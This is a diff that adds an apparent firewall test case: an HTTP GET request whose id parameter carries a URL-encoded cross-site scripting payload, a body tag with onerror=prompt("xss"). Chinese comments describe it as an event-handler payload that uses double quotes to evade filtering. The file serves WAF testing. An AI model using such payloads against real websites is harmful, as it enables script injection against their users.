@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_body标签_onerror事件-06506505
+# 利用onerror=prompt("xss")在页面加载时触发错误事件来执行弹窗脚本。当资源加载失败或导致错误时触发，使用双引号绕过。
+GET /?id=%3Cbody%20onerror=prompt%28%22xss%22%29%20onload=%2F%3E&bid=hd_tag_m8mv26dg HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26dg
+RM-PRO-Token: a51c293a24d86d345fa7c4a078e643e1
+RM-PRO-Time: 1742808583322
+User-Agent: curl/7.83.1
+
